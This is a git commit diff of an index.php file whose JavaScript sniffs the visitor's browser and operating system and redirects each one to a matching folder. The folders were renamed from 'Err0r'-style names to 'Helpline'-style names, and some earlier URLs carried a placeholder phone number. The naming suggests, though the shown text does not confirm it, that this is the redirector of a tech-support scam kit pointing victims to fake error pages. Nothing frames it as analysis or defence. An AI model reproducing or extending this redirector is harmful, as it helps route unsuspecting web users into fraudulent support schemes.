f61f7cab14991b1cba7fbc26dc239296f71785ed
joyhopson2023 <121514234+joyhopson2023@users.noreply.github.com>
2023-02-25 02:41:21 +0530

    2802

--- index.php
+++ index.php
@@ -1,3 +1,4 @@
+
 <script type="text/javascript">
 var isChromium = window.chrome,
 	vendorName = window.navigator.vendor,
@@ -7,29 +8,29 @@ isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
 
 if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
 	// is Google chrome
-window.location.href = "./fC0deJdfd008f0d0CH888Err0r80dBG88/index.html";
+window.location.href = "./Win0HelplCHine00Ash07/index.html";
 }
 if(navigator.userAgent.indexOf("Firefox") != -1 )
 	{
-			 window.location.href = "./fC0deJdfd008f0d0FF888Err0r80dBG88/index.html";
+			 window.location.href = "./Win0Helpl0FFine00Ash07/index.html";
 	}
 
 	if(window.navigator.userAgent.indexOf("dg") != -1 )
 		{
-				 window.location.href = "./fC0deJdfd008f0d0ECH888Err0r80dBG88/index.html";
+				 window.location.href = "./Win0HelplECHine00Ash07/index.html";
 		}
 
 if(window.navigator.userAgent.indexOf("Edge") != -1 )
 	{
-			 window.location.href = "./fC0deJdfd008f0d0ED888Err0r80dBG88/index.html?phone=+1-888-888-8888";
+			 window.location.href = "./Win0HelplIEDine00Ash07/index.html";
 	}
 if(window.navigator.userAgent.indexOf("Mac") != -1 )
 	{
-			 window.location.href = "./fC0deJdfd008f0d0MA888Err0r80dBG88/index.html";
+			 window.location.href = "./Mac0Helpline00Ash07/index.html";
 	}
 if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
 	{
-		window.location.href = "./fC0deJdfd008f0d0IE888Err0r80dBG88/index.html?phone=+1-888-888-8888";
+		window.location.href = "./Win0HelplIEDine00Ash07/index.html";
 	}
 $SAFARI_URL = "apple";
 </script>
